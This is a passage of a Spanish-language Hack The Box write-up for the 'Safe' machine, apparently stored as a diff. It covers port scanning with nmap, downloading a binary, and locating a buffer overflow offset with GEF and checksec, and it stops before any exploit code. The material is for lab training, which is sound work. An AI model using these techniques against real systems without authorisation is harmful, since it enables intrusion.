-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/2.png&quot; alt=&quot;2&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del &lt;em&gt;TTL&lt;/em&gt;; en este caso el valor del &lt;em&gt;TTL&lt;/em&gt; de la máquina es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;63&lt;/code&gt;, por lo que podemos intuir que estamos ante una máquina &lt;em&gt;Linux&lt;/em&gt;. Recordemos que algunos de los valores referenciales son los siguientes:&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Sistema Operativo (OS)&lt;/th&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;TTL&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Linux&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;64&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Windows&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;128&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Solaris&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;254&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;Si nos damos cuenta, en esta ocasión, el valor del &lt;em&gt;TTL&lt;/em&gt; es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;63&lt;/code&gt; y no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;64&lt;/code&gt; como indica la tabla anterior, esto se debe a que en el entorno de máquinas de &lt;em&gt;Hack The Box&lt;/em&gt;, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un nodo intermediario, por lo que el &lt;em&gt;TTL&lt;/em&gt; disminuye en una unidad.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping -c 1 10.10.10.147 -R                               
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/3.png&quot; alt=&quot;3&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Posteriormente, vamos a utilizar la herramienta &lt;em&gt;Nmap&lt;/em&gt; para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.147
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;En caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.147
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A continuación se explican los parámetros utilizados en el escaneo de puertos con &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Parámetro&lt;/th&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Explicación&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-p-&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Escanea todo el rango de puertos (65535 en total)&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;--open&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos)&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-T5&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;White Hat&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-v&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;&lt;em&gt;Verbose&lt;/em&gt;, reporta lo encontrado por consola&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-n&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;No aplicar &lt;em&gt;resolución DNS&lt;/em&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-sS&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Escaneo &lt;em&gt;TCP SYN&lt;/em&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-min-rate&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Emitir paquetes no más lentos que &amp;lt;valor&amp;gt; por segundo&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-vvv&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Triple &lt;em&gt;verbose&lt;/em&gt;, para obtener mayor información por consola&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-Pn&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;No aplicar &lt;em&gt;host discovery&lt;/em&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 22,80,1337 10.10.10.147
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Parámetro&lt;/th&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Explicación&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-sC&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Scripts básicos de enumeración&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-sV&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Versión y servicios que corren bajo los puertos encontrados&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-p&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior)&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;Basándonos en la información que nos reporta &lt;em&gt;Nmap&lt;/em&gt;, podemos darnos cuenta que la máquina víctima tiene abierto un puerto relacionado con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt;; asimismo, encontramos abierto el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1337&lt;/code&gt;, relacionado con el protocolo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WASTE&lt;/code&gt;, el cual permite el intercambio de archivos de forma cifrada.&lt;/p&gt;
-
-&lt;p&gt;Debido a que la máquina cuenta con el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt; abierto, podríamos intentar aplicar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fuzzing&lt;/code&gt;, no obstante, no vamos a encontrar nada interesante.&lt;/p&gt;
-
-&lt;p&gt;Lo siguiente que podemos hacer es determinar ante que nos estamos enfrentando, para ello podemos hacer uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WhatWeb&lt;/code&gt;, herramienta que se encarga de identificar que tecnologías web se están empleando, véase gestores de contenido (CMS), librerias o plugins, o finalmente el sistema operativo que se está utilizando para alojar el servidor web.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whatweb http://10.10.10.147
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/4.png&quot; alt=&quot;4&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Como podemos observar, no hay nada especialmente relevante a excepción del título de la página, el cual es el mensaje por defecto que aparece cuando montamos una página web haciendo uso del servidor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Apache&lt;/code&gt;, por lo que podemos irnos haciendo a la idea, de que la entrada a la máquina, no será vía web.&lt;/p&gt;
-
-&lt;p&gt;En vista de que ya no nos es posible trabajar desde la terminal, tendremos que visitar estas páginas desde nuestro navegador.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/5.png&quot; alt=&quot;5&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;En efecto, lo primero que vemos al abrir la página web, es la página por defecto que viene cuando montamos una página web mediante el servidor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Apache&lt;/code&gt;, por lo que, podemos inspeccionar el código fuente, en busca de alguna pista; para verlo de manera más cómoda podemos hacer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ctrl + U&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/6.png&quot; alt=&quot;6&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si nos percatamos, en las primeras líneas del código fuente, hay un comentario que nos menciona que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;, alojado en el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1337&lt;/code&gt;, lo podemos descargar; para ello, podemos intentar añadir &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/myapp&lt;/code&gt;, al final del url.&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;Los comentarios en HTML, siempre tienen la siguiente estructura:&lt;/em&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;!-- Este es un comentario a modo de prueba --&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/7.png&quot; alt=&quot;7&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Al añadir &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/myapp&lt;/code&gt;, al final del url, se nos va a descargar un archivo que lleva por nombre, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;, el cual vamos a empezar a analizar.&lt;/p&gt;
-
-&lt;h3 id=&quot;fase-de-explotación&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Explotación&lt;/h3&gt;
-
-&lt;p&gt;Lo primero que debemos hacer, es saber que es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;, para ello podemos usar el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;file myapp
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/8.png&quot; alt=&quot;8&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Nos damos cuenta de que el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;, es un binario, por lo que procederemos a darle permisos de ejecución para saber qué hace:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;chmod 744 myapp
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/9.png&quot; alt=&quot;9&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Al ejecutar el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;, nos reporta por consola la hora actual, además de imprimir el mismo mensaje que introduzcamos; esto no nos es de ayuda, por lo que podríamos intentar extraer las cadenas de caracteres que se encuentran dentro del binario con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strings&lt;/code&gt;, sin embargo, no hay nada interesante.&lt;/p&gt;
-
-&lt;p&gt;Lo siguiente que podríamos intentar, sería realizar un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Buffer Overflow&lt;/code&gt;, para ello, cuándo el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;, nos pregunte por una cadena de caracteres, debemos ingresar una que sea bastante larga.&lt;/p&gt;
-
-&lt;p&gt;Una manera rápida con la cual podemos conseguir cadenas de caracteres cuan largas queramos, sería haciendo uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Python&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;print &quot;A&quot;*365&apos;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/10.png&quot; alt=&quot;10&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si nos percatamos, al introducir nuestra cadena de &lt;em&gt;365 letras A&lt;/em&gt;, el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;, deja de funcionar como debería, esto se debe a un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Segmentation Fault&lt;/code&gt; (&lt;em&gt;Fallo de Segmentación&lt;/em&gt;), los cuales se dan cuando empezamos a sobrescribir registros. Ahora, ¿por qué se están sobrescribiendo algunos registros?&lt;/p&gt;
-
-&lt;p&gt;Cuando el programa &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;, nos pregunta por una cadena de caracteres, este almacena nuestra respuesta en un bloque de memoria, el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buffer&lt;/code&gt;, el cual puede almacenar una cierta cantidad de bytes, la cual de momento desconocemos; si introducimos una cantidad de bytes mayor a la que el buffer estaba diseñado, el programa corrompe.&lt;/p&gt;
-
-&lt;p&gt;La pregunta ahora es, ¿a dónde se dirigen estos bytes que están desbordando el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buffer&lt;/code&gt;, acaso desaparecen? La respuesta es no, como mencioné, empezamos a sobrescribir registros, de modo que los bytes siguientes a la cantidad máxima de bytes que soporta el buffer, se dirigen al siguiente valor de memoria, y así sucesivamente.&lt;/p&gt;
-
-&lt;p&gt;El concepto de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Buffer Overflow&lt;/code&gt; puede parecer complejo en un inicio, pero es mucho más fácil de asimilarlo cuando lo visualizamos; para ello, haremos uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GDB&lt;/code&gt;, herramienta que nos permitirá depurar el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;. Concretamente estaré haciendo uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GEF&lt;/code&gt; (&lt;em&gt;GDB Enhanced Features&lt;/em&gt;), el cual es una extensión para GDB, así como lo es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PEDA&lt;/code&gt; (&lt;em&gt;Python Exploit Development Assistance&lt;/em&gt;).&lt;/p&gt;
-
-&lt;p&gt;Si queremos instalar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GEF&lt;/code&gt;, podemos seguir las instrucciones dadas por la &lt;a href=&quot;https://gef.readthedocs.io/en/main/#setup&quot;&gt;página oficial&lt;/a&gt;, no obstante, en mi caso, esto no me funcionó, por lo que tuve que realizar lo siguiente:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pip3 install capstone unicorn keystone-engine ropper
-
-wget https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/gefInstall.sh
-chmod 744 gefInstall.sh
-./gefInstall.sh
-rm gefInstall.sh
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GEF&lt;/code&gt; instalado podemos empezar a depurar el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb myapp
-
-run
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/11.png&quot; alt=&quot;11&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/12.png&quot; alt=&quot;12&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Algo importante a mencionar, antes de empezar el análisis con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GEF&lt;/code&gt;, es que la arquitectura del sistema ante el que nos estamos enfrentando a la hora de explotar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Buffer Overflow&lt;/code&gt;, tiene bastante relevancia; en este caso concreto, nos estamos enfrentando ante una máquina de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;64 bits&lt;/code&gt;, y esto lo podemos saber ya que el nombre de los registros empieza por ‘R’ (&lt;em&gt;RBP, RSP, RIP&lt;/em&gt;), en caso de que el sistema fuera de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;32 bits&lt;/code&gt;, el nombre de los registros empezaría por ‘E’ (&lt;em&gt;EBP, ESP, EIP&lt;/em&gt;), no obstante, independientemente de la arquitectura, estos registros se refieren a lo mismo.&lt;/p&gt;
-
-&lt;p&gt;Para explotar un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Buffer Overflow&lt;/code&gt; satisfactoriamente, existen dos requisitos indispensables, el primero es sobrescribir el registro &lt;em&gt;RIP&lt;/em&gt; o &lt;em&gt;EIP&lt;/em&gt; (según corresponda), ya que este, apunta a la dirección siguiente a ejecutar, por lo que nos interesa como atacantes redirigir el flujo del programa a nuestro antojo, cabe aclarar que la dirección introducida debe de existir dentro del programa, caso contrario, este corromperá como lo está haciendo ahora mismo; el segundo requisito se refiere a, de qué manera vamos a sobrescribir el registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RIP&lt;/code&gt;, para ello debemos calcular su &lt;em&gt;offset&lt;/em&gt;.&lt;/p&gt;
-
-&lt;p&gt;Sobre el mensaje &lt;em&gt;Cannot disassemble from $PC&lt;/em&gt;, veremos una pequeña flecha que nos indica en que sección, el programa dejó de funcionar, en este caso es en una función de retorno que apunta hacia el registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSP&lt;/code&gt;, el cual, si nos percatamos, está lleno de &lt;em&gt;letras A&lt;/em&gt;; nuestro objetivo ahora es, determinar después de cuántos bytes, empezaremos a sobrescribir el registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSP&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Haciendo uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GEF&lt;/code&gt;, esto es bastante sencillo, ya que lo hará por nosotros, por lo que debemos realizar lo siguiente:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb myapp
-
-pattern create
-run
-pattern offset $rsp
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/13.png&quot; alt=&quot;13&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/14.png&quot; alt=&quot;14&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Sabemos ahora que, después de ingresar &lt;em&gt;120 bytes&lt;/em&gt;, empezaremos a sobrescribir el registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSP&lt;/code&gt;, y esto lo podemos comprobar de manera sencilla, intentando ingresar en este registro, &lt;em&gt;8 letras B&lt;/em&gt;, por ejemplo.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;print &quot;A&quot;*120 + &quot;B&quot;*8&apos;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb myapp
-
-run
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/15.png&quot; alt=&quot;15&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/16.png&quot; alt=&quot;16&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;En efecto, al ingresar &lt;em&gt;120 bytes&lt;/em&gt;, empezamos a sobrescribir el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSP&lt;/code&gt;, ya con esto en mente, debemos verificar que estándares de seguridad se están aplicando sobre el binario, para así determinar que metodología emplearemos para explotarlo; para conocer que seguridades se están aplicando, haremos uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;checksec&lt;/code&gt;, esto podemos hacerlo tanto dentro de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GEF&lt;/code&gt;, como fuera de él.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb myapp
-
-checksec
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/17.png&quot; alt=&quot;17&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;checksec myapp
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/18.png&quot; alt=&quot;18&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
